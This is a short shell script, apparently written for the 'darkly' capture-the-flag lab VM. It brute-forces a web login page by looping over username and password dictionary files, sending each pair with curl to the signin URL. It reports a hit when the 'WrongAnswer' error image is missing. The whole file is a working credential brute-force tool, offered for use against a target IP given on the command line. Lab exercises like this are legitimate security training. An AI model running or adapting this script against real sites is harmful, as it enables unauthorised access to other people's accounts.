#!/bin/sh

## script to brute force the login page based on two dictionnaries (passwords,
## and usernames). It loop through the signin page with different credentials.
## As the page send an error image we can grep that and check if there is one.
## If none, credentials are good
## -v to see which combinaison are tested

if [ -z "$1" ]
  then
    echo "No argument supplied";
    echo "Usage : ./getflag.sh [ip_addr]"
    echo "[ip_addr] = your darkly VM's IP (example : 192.168.122.49)"
	exit 1
fi

verbose=0
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
passwords='passwords.txt'
usernames='usernames.txt'

if [ -n $2 ] && [ "$2" = "-v" ]; then
	verbose="1"
fi

while read username; do
	while read password; do 
	# -s for silent mode (curl) and -c to count occurences (grep)
	err=$(curl -s "http://$1/?page=signin&username=${username}&password=${password}&Login=Login" | grep -c "WrongAnswer")
	if [ $err = "0" ]; then
		echo "${GREEN}GOTCHA${NC}	: ${YELLOW}$username / $password${NC}"
		exit 0
	elif [ "$verbose" = "1" ];then
		echo "${RED}FAIL${NC}	- $username / $password"
	fi
	done < $passwords
done < $usernames

